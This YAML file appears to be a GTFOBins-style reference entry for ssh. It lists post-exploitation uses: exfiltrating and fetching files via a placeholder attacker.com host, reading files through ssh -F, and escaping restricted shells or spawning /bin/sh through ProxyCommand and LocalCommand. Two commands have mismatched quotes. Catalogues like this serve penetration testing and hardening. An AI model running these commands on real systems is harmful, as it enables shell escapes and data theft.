---
functions:
  download:
  - code: |-
      ssh user@attacker.com 'cat /path/to/input-file"
    contexts:
      sudo:
      suid:
      unprivileged:
    sender: ssh-server
  file-read:
  - code: |-
      ssh -F /path/to/input-file x
    comment: |-
      The read file content is corrupted by error prints.
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      ssh localhost /bin/sh
    comment: |-
      Reconnecting may help bypassing restricted shells.
    contexts:
      sudo:
      suid:
      unprivileged:
  - code: |-
      ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
    contexts:
      sudo:
      unprivileged:
  - code: |-
      ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
    comment: |-
      Spawn the shell on the client, but still requires a successful remote connection.
    contexts:
      sudo:
      unprivileged:
  upload:
  - code: |-
      echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: ssh-server
...
